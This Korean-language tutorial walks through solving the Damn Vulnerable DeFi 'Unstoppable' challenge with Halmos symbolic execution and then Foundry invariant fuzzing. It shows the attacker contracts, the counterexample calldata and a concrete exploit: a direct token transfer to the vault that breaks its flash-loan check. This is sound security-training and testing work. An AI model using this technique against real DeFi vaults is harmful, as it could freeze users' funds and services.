# Halmos vs Unstoppable 
## Halmos 버전
이 글에서는 **halmos 0.2.1.dev16+g1502e46** 버전이 사용되었습니다.

## 아이디어 개요
이 챌린지를 어떻게 해결할지 모른다고 상상해 봅시다. 우리가 아는 것은 계약의 코드, 미리 작성된 `setUp()` 함수, 도달해야 하는 최종 상태, 그리고 솔루션을 작성해야 하는 `test_unstoppable()` 함수뿐입니다.

아이디어는 다음과 같습니다:
1. `player`가 제어하는 **SymbolicAttacker** 계약을 생성하고 필요한 모든 자원(**DamnValuableToken** 공급량)을 제공합니다.

2. **SymbolicAttacker**는 필요한 상태를 찾기 위해 모든 가능한 매개변수로 모든 알려진 계약을 심볼릭하게 실행할 수 있어야 합니다.

3. `_isSolved()` 함수에 기존의 것과 반대되는 `assert`를 작성합니다. 즉, 만약 다음과 같다면:
    ```solidity
    assertTrue(*어떤 조건*);
    ```
    이것을 다음과 같이 변경할 것입니다:
    ```solidity
    assertFalse(*어떤 조건*);
    ```
    그러면 Halmos는 이 조건이 **참(true)**이 되는 반례를 찾을 것입니다. 이것이 챌린지에 대한 우리의 솔루션이 될 것입니다.

4. 이 반례를 초기 코드에 붙여넣고 **forge test**를 실행합니다.

5. **forge test**가 통과되어야 합니다.

## 공통 필수 조건
1. **Unstoppable.t.sol** 파일을 **Unstoppable_Halmos.t.sol**로 복사합니다. 모든 Halmos 관련 변경 사항은 여기서 수행해야 합니다.

2. Halmos는 
    ```solidity
    vm.expectEmit()
    ```
    치트코드를 지원하지 않으므로, 이 코드를 단순히 삭제합니다.

3. `test_unstoppable()`의 이름을 `check_unstoppable()`로 변경하여 Halmos가 이 테스트를 심볼릭하게 실행하도록 합니다.

4. `makeAddr()` 치트코드 사용을 피해야 합니다. 왜냐하면 Halmos는 이러한 주소를 심볼릭으로 취급하여 잘못된 반례를 초래하기 때문입니다. 간단히 말해서, Halmos는 `deployer`와 `player`가 같은 주소를 가진다고(같은 사람이라고) 가정할 수 있으며, 이는 챌린지의 본질을 파괴합니다. 따라서 우리는 `makeAddr()`을 특정 하드코딩된 값으로 대체해야 합니다:
    ```solidity
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    ```
    이것을 다음과 같이 변경합니다:
    ```solidity
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    ```

5. Halmos 실행은 assertion 제한 시간 없이 수행되어야 합니다:
    ```
    halmos <...> --solver-timeout-assertion 0
    ```

## SymbolicAttacker 계약 배포
자, 이제 `check_unstoppable()` 함수를 작성해 봅시다:
```solidity
function  check_unstoppable() public  checkSolvedByPlayer {
    SymbolicAttacker attacker =  new SymbolicAttacker(); // 공격자 계약 배포
    token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE); // 필요한 자원을 공격자에게 전송
    attacker.attack(); // 심볼릭 공격 실행
}
```
지금까지는 꽤 간단합니다.

## SymbolicAttacker 구현
우선, 심볼릭 실행과 일반적인 forge 치트코드를 지원해야 합니다. 필요한 것들을 가져와 봅시다:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "halmos-cheatcodes/SymTest.sol";;
import "forge-std/Test.sol";
```

우리 아이디어의 기초는 버그로 이어질 것으로 가정하는 어떤 트랜잭션의 심볼릭 실행이므로, 공격 함수의 구현은 다음과 같습니다:
```solidity
contract SymbolicAttacker is Test, SymTest {
    function attack() public {
        address target = svm.createAddress("target");
        bytes memory data = svm.createBytes(100, 'data');
        target.call(data);
    }
}
```
attack() 함수를 한 줄씩 분석해 봅시다:
1. 어떤 계약 호출이 버그를 유발하는지 모르기 때문에, target을 어떤 심볼릭 주소로 작업합니다.
    ```solidity
    address target = svm.createAddress("target");
    ```
2. 여기 상황도 비슷합니다 - 계약의 어떤 함수와 어떤 매개변수가 버그를 트리거하기 위해 호출되어야 하는지 모르기 때문에, calldata를 심볼릭 값으로 작업합니다.
    ```solidity
    bytes memory data = svm.createBytes(100, 'data');
    ```
3. 마침내 마법이 일어나는 곳에 도착했습니다:
심볼릭 주소로 호출을 하면, Halmos는 자동으로 알려진 모든 계약을 무차별 대입(brute force)으로 처리합니다. 이 경우, **DamnValuableToken**, **UnstoppableVault**, **UnstoppableMonitor**, 그리고 의외로 **SymbolicAttacker** 자신입니다(이에 대해서는 나중에 다시 다루겠습니다). 따라서 심볼릭 calldata **data**도 해당 심볼릭 매개변수를 가진 계약의 모든 가능한 진입점으로 무차별 대입될 것입니다.
    ```solidity
    target.call(data);
    ```

## _isSolved() 구현 및 반례
이 함수는 `check_unstoppable()` 직후에 실행되는 확인 함수입니다. `attacker`가 작업을 마쳤으므로 상태를 확인하고 반례를 생성할 시간입니다.
원래 확인 로직은 다음과 같습니다:
```solidity
function  _isSolved() private {
    ...
    // And now the monitor paused the vault and transferred ownership to deployer
    assertTrue(vault.paused(), "Vault is not paused");
    assertEq(vault.owner(), deployer, "Vault did not change owner");
}
```
그러면 반대 확인은 다음과 같을 것입니다:
```solidity
function  _isSolved() private {
    ...
    assert(vault.paused() == false || vault.owner() != deployer);
}
```
마지막으로 실행합니다:
```bash
~$ halmos --function check_unstoppable --solver-timeout-assertion 0
...
Running 1 tests for test/unstoppable/Unstoppable_Halmos.t.sol:UnstoppableChallenge
Counterexample:
Running 1 tests for test/unstoppable/Unstoppable_Halmos.t.sol:UnstoppableChallenge
WARNING:halmos:Counterexample (potentially invalid):
halmos_data_bytes_2658b5c_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0002
(see https://github.com/a16z/halmos/wiki/warnings#counterexample-invalid)
WARNING:halmos:Counterexample (potentially invalid):
halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
halmos_data_bytes_8a799d8_04 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa00030000000000000000000000000000000000000000000000007f3ffce4e8f1c0000000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0002
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005
(see https://github.com/a16z/halmos/wiki/warnings#counterexample-invalid)
WARNING:halmos:Counterexample (potentially invalid):
halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
halmos_data_bytes_8a799d8_04 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
halmos_data_bytes_9d914dc_06 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000804013125f0000000000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0005
halmos_target_address_d348a8b_05 = 0x00000000000000000000000000000000aaaa0002
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005
(see https://github.com/a16z/halmos/wiki/warnings#counterexample-invalid)
....
```
만세! 우리는 매우 유사한 다수의 반례를 받았습니다. 반례들이 꼬리에 꼬리를 물고 나타나서, 어느 시점에서는 분석 과정을 중단해야 했습니다. 여기서 무슨 일이 일어났는지 분석해 봅시다.

## 반례 분석
### 다수의 반례 처리
우선 테스트 실행 시작 부분에 로깅을 추가해 봅시다. 배포된 각 계약의 주소를 살펴봅시다:
```bash
function check_unstoppable() public  checkSolvedByPlayer {
        SymbolicAttacker attacker =  new SymbolicAttacker(); // 공격자 계약 배포
        console.log("token\t", address(token));
        console.log("vault\t", address(vault));
        console.log("monitor\t", address(monitorContract));
        console.log("attacker\t", address(attacker));
        ...
```
그리고 다시 실행:
```bash
~$ halmos --function check_unstoppable --solver-timeout-assertion 0
...
Running 1 tests for test/unstoppable/Unstoppable_Halmos.t.sol:UnstoppableChallenge
[console.log] token      0x00000000000000000000000000000000000000000000000000000000aaaa0002
[console.log] vault      0x00000000000000000000000000000000000000000000000000000000aaaa0003
[console.log] monitor    0x00000000000000000000000000000000000000000000000000000000aaaa0004
[console.log] attacker   0x00000000000000000000000000000000000000000000000000000000aaaa0005         
```
이제 주소 정보를 확보했습니다. 첫 번째 반례를 간단히 살펴봅시다:
```solidity
halmos_data_bytes_2658b5c_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0002    
```
여기서 `attacker`는 `token` 계약에 대해 어떤 트랜잭션을 실행했고, 이것이 버그로 이어졌습니다. 더 깊이 연구하기 전에 다른 반례들을 고려할 필요가 있습니다:
```solidity
halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
halmos_data_bytes_8a799d8_04 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa00030000000000000000000000000000000000000000000000007f3ffce4e8f1c0000000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0002
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005  
```
그리고
```solidity
halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
halmos_data_bytes_8a799d8_04 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
halmos_data_bytes_9d914dc_06 =
0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000804013125f0000000000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0005
halmos_target_address_d348a8b_05 = 0x00000000000000000000000000000000aaaa0002
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005
```
**0x0...aaaa0005**가 공격자의 주소라는 것을 이미 알고 있으므로, 우리는 재귀를 다루고 있다는 것을 쉽게 추측할 수 있습니다. 공격자가 자신의 `attack()` 함수를 호출함으로써 가짜 반례들로 분석을 부풀리고 있습니다. 이것을 고치는 것은 꽤 간단합니다 - 심볼릭 주소를 생성할 때 `vm.assume()` 치트코드를 사용하기만 하면 됩니다:
```solidity
function attack() public {
        address target = svm.createAddress("target");
        vm.assume (target != address(this)); // 재귀 방지
        ...
```
이제 재귀적인 반례들을 제거했고 의미 있는 하나만 남았습니다.

### Calldata 분석

우리는 이미 공격이 `token` 주소에 대한 어떤 트랜잭션에 기반하고 있다는 것을 알고 있습니다.
```solidity
0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
```
Foundry에서 제공하는 **cast** 커맨드 라인 도구를 사용하여 정확한 함수와 매개변수를 쉽게 밝혀낼 수 있습니다:
```bash
 cast 4byte-decode 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
 1) "transfer(address,uint256)"
 0x00000000000000000000000000000000aaaA0003
 8372529336254726145 [8.372e18]                                   
```
이 calldata를 단계별로 분석해 봅시다:
```bash
 1) "transfer(address,uint256)"
```
이것은 단지 **ERC20** `transfer()` 함수입니다.
```bash
0x00000000000000000000000000000000aaaA0003
```
분명히 이것은 금고(vault) 계약의 주소입니다.
```bash
 8372529336254726145 [8.372e18]
```
그리고 마지막 매개변수는 보낼 금액입니다.
결과적으로, 우리는 모든 것을 명확히 했습니다: 공격자는 `vault` 계약에 일부 토큰을 보내고, 이는 플래시론 오류로 이어져야 합니다.

## 반례 사용
우선, **forge**에서 모든 계약 주소를 찾아봅시다. 여기서도 동일한 콘솔 로깅을 사용할 것이며 결과는 다음과 같습니다:
```bash
~$ forge test -vv --mp test/unstoppable/Unstoppable.t.sol
...
Logs:
token          0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b
vault          0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264
monitor        0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5
  ...
```
비심볼릭 공격자 계약을 구현합니다:
```solidity

pragma solidity =0.8.25;

import "halmos-cheatcodes/SymTest.sol";;
import "forge-std/Test.sol";

contract Attacker is Test, SymTest {
	function attack() public {
        address target = address(0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b);
        bytes memory data = hex"a9059cbb0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000";
        target.call(data);
    }
}
```
이것은 심볼릭 값을 반례에서 얻은 구체적인 값으로 대체했다는 점을 제외하면 **SymbolicAttacker**의 정확한 사본입니다.
그리고 물론, Halmos의 주소를 Foundry 주소로 대체했습니다.

그리고 `test_unstoppable()`:
```solidity
function test_unstoppable() public checkSolvedByPlayer {
        Attacker attacker = new Attacker();
        token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE);
        attacker.attack();
    }
```
실행해 봅시다:
```bash
forge test -vv --mp test/unstoppable/Unstoppable.t.sol
...
Ran 2 tests for test/unstoppable/Unstoppable.t.sol:UnstoppableChallenge
[PASS] test_assertInitialState() (gas: 57390)
[PASS] test_unstoppable() (gas: 899808)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.56ms 
Ran 1 test suite in 37.58ms (1.56ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests) 
```
성공! "Unstoppable" 챌린지는 Halmos 심볼릭 테스팅을 사용하여 성공적으로 해결되었습니다.

## 퍼징은 어떤가요?
이 글을 쓰는 시점에서, 인터넷에서 **Crytic team**의 [Echidna 주도](https://github.com/crytic/damn-vulnerable-defi-echidna/blob/solutions/contracts/unstoppable/UnstoppableEchidna.sol) 솔루션과 **devdacian**의 [Foundry 주도](https://github.com/devdacian/solidity-fuzzing-comparison/blob/main/test/02-unstoppable/UnstoppableBasicFoundry.t.sol) 솔루션을 찾을 수 있습니다. 그러나 이 솔루션들은 "Unstoppable"의 구버전을 위해 만들어졌습니다. 현재 버전은 다른 불변 조건을 확인해야 하므로 현대화된 솔루션으로 작업할 것입니다. 물론, Damn-Vulnerable-Defi의 현재 버전이 Foundry에서 완전히 재작성되었기 때문에 저는 퍼징 엔진으로 불변성 주도 Foundry를 선택했습니다.

### 불변 조건 (Invariant)
불변 조건은 명백합니다 - 저는 단순히 **Unstoppable_Halmos.t.sol**의 `_isSolved()` 함수 코드를 가져와서 사용했습니다:
```solidity
function invariant_check_flash_loan() public {
    vm.prank(deployer);
    monitorContract.checkFlashLoan(100e18);
    // Foundry는 여기서 반례를 생성해야 합니다.
    // 우리는 그것이 금고를 일시 중지시키는 계약과 데이터를 찾을 것으로 기대합니다.
    assert(vault.paused() == false || vault.owner() != deployer);
}
```

### SetUp()
그리고 `SetUp()`은 공격하는 행위자가 오직 `player`뿐임을 나타내도록 다소 변경되었습니다:
```solidity
function setUp() public {
...
    vm.stopPrank();
    targetSender(player);
}
```

### 퍼징 결과
퍼징으로 변경된 Unstoppable을 실행해 봅시다:
```bash
~$ forge test -vvv --mp test/unstoppable/Unstoppable_Fuzz.t.sol
...
[FAIL: invariant_check_flash_loan replay failure]
[Sequence]
sender=0x44E97aF4418b7a17AABD8090bEA0A471a366305C addr=[src/DamnValuableToken.sol:DamnValuableToken]0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b calldata=transfer(address,uint256) args=[0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264, 1725540768 [1.725e9]]
...
```
이 방법 또한 빠르고 간단하게 공격 트랜잭션을 찾아냈습니다.

## 결론
1. 우리는 Halmos가 CTF 문제를 해결하는 데 사용될 수 있음을 증명했습니다. 우리는 간단한 단일 트랜잭션 챌린지를 가졌고 Halmos는 다소 직관적이고 이해하기 쉬운 방식으로 해결했습니다.
2. 하드코딩된 주소와 매개변수 때문에 반례 분석이 까다로울 수 있습니다. 반례를 소스 코드에 단순히 넣고 Halmos 내부에서처럼 동작하기를 기대할 수는 없습니다.
3. 일반 Foundry 테스트를 Halmos로 마이그레이션하려고 할 때, Foundry의 지원되지 않는 기능이나 `makeAddr()`과 같은 까다로운 치트코드를 사용하지 않도록 주의해야 합니다.
4. 재귀에 빠지는 것은 잘못된 반례로 이어지거나 코드 커버리지를 줄일 수 있으므로 피해야 합니다.
5. 사소한 해결책이 있는 꽤 간단한 문제의 경우, 퍼징을 통한 해결책이 훨씬 간단해 보이고 실제로 그렇습니다: 그것을 작성하는 데 Halmos를 통해 해결하는 것보다 10배 적은 시간과 노력이 들었습니다. 그러나, **!!!스포일러 주의!!!**, Halmos는 이어지는 덜 사소한 챌린지들에서 그 위력을 보여줄 것입니다.

## 다음 단계는?
이 시리즈의 다음 글은 [Truster](https://github.com/Burnnnnny/damn-vulnerable-defi-halmos/tree/master/test/truster) 크래킹입니다.
